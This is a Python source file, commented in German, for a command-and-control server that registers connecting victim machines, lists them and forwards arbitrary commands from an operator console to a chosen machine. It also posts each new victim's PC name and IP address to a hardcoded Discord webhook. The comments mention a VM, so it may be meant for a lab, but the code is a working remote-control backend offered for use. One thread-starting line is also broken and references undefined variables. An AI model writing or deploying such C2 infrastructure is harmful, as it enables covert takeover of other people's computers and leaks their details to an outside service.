import socket
import threading
import time
import urllib.request
import json

HOST = '0.0.0.0'
PORT_CLIENTS = 5000  # Worauf sich die VM verbindet
PORT_CONTROLLER = 5001  # Worauf sich dein Main-PC verbindet
DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1548383288035647538/5Zn_HTmOqALj3qY-MmsltcK-oOaB1uifjX4Dz0d-ACgUqYBhoqTSu8PVBty-Qd3_uAOZ'

clients = {}
client_counter = 1
clients_lock = threading.Lock()

def send_discord_webhook(content):
    if "DEIN_DISCORD" in DISCORD_WEBHOOK_URL:
        return
    payload = {"content": content}
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        DISCORD_WEBHOOK_URL, data=data,
        headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
    )
    try:
        urllib.request.urlopen(req)
    except Exception:
        pass

def handle_client(conn, addr, client_id):
    try:
        pc_name = conn.recv(1024).decode('utf-8', errors='ignore').strip()
        if not pc_name:
            pc_name = "Unbekannt"
        
        connect_time = time.strftime("%Y-%m-%d %H:%M:%S")
        with clients_lock:
            clients[client_id] = {"conn": conn, "addr": addr, "pc_name": pc_name, "time": connect_time}
        
        send_discord_webhook(f"[C2] Neuer Client verbunden!\nID: {client_id}\nPC-Name: {pc_name}\nIP: {addr[0]}")
        
        while True:
            data = conn.recv(1024)
            if not data:
                break
    except Exception:
        pass
    finally:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        conn.close()

def handle_controller(controller_conn):
    active_control_id = None
    try:
        while True:
            cmd = controller_conn.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd:
                break
            
            if active_control_id is None:
                if cmd == "sc":
                    with clients_lock:
                        if not clients:
                            response = "Keine Clients verbunden.\n"
                        else:
                            response = "\nID\tPC-Name\t\tIP-Adresse\tVerbunden seit\n" + "-" * 55 + "\n"
                            for cid, info in clients.items():
                                response += f"{cid}\t{info['pc_name']}\t\t{info['addr'][0]}\t{info['time']}\n"
                    controller_conn.sendall(response.encode('utf-8'))
                elif cmd.startswith("rem c "):
                    parts = cmd.split(" ")
                    if len(parts) == 3:
                        try:
                            target_id = int(parts[2])
                            with clients_lock:
                                if target_id in clients:
                                    clients[target_id]["conn"].close()
                                    controller_conn.sendall(f"Client {target_id} entfernt.\n".encode('utf-8'))
                                else:
                                    controller_conn.sendall(b"ID nicht gefunden.\n")
                        except ValueError:
                            controller_conn.sendall(b"Ungueltige ID.\n")
                else:
                    if cmd.isdigit():
                        target_id = int(cmd)
                        with clients_lock:
                            if target_id in clients:
                                active_control_id = target_id
                                controller_conn.sendall(f"[*] Kontrollmodus fuer Client {target_id} gestartet. 'exit' zum Verlassen.\n".encode('utf-8'))
                            else:
                                controller_conn.sendall(b"ID nicht gefunden.\n")
                    else:
                        controller_conn.sendall(b"Unbekannter Befehl.\n")
            else:
                if cmd.lower() == "exit":
                    active_control_id = None
                    controller_conn.sendall(b"[*] Kontrollmodus verlassen.\n")
                    continue
                
                with clients_lock:
                    if active_control_id in clients:
                        target_conn = clients[active_control_id]["conn"]
                        try:
                            target_conn.sendall((cmd + "\n").encode('utf-8'))
                            # Kurze Pause, damit die VM antworten kann
                            time.sleep(0.5)
                            # Wir holen die Ausgabe direkt vom Target (vereinfacht)
                            response = "[Befehl gesendet]\n"
                        except Exception as e:
                            response = f"Fehler: {e}\n"
                            active_control_id = None
                    else:
                        response = "Client nicht mehr verbunden.\n"
                        active_control_id = None
                controller_conn.sendall(response.encode('utf-8'))
    except Exception:
        pass
    finally:
        controller_conn.close()

def main():
    s_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s_client.bind((HOST, PORT_CLIENTS))
    s_client.listen(5)

    s_ctrl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_ctrl.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s_ctrl.bind((HOST, PORT_CONTROLLER))
    s_ctrl.listen(1)

    print(f"[*] Server laeuft. Clients auf Port {PORT_CLIENTS}, Controller auf Port {PORT_CONTROLLER}...")

    threading.Thread(target=lambda: [s_client.accept()[0] and threading.Thread(target=handle_client, args=(c, a, x)).start() for c, a in [(s_client.accept())] for x in [1]], daemon=True).start() # Vereinfachter Accept-Loop unten im echten Betrieb

    # Sauberer Accept Loop für Clients:
    def client_accept_loop():
        global client_counter
        while True:
            conn, addr = s_client.accept()
            cid = client_counter
            client_counter += 1
            threading.Thread(target=handle_client, args=(conn, addr, cid), daemon=True).start()

    threading.Thread(target=client_accept_loop, daemon=True).start()

    while True:
        ctrl_conn, _ = s_ctrl.accept()
        threading.Thread(target=handle_controller, args=(ctrl_conn,), daemon=True).start()

if __name__ == '__main__':
    main()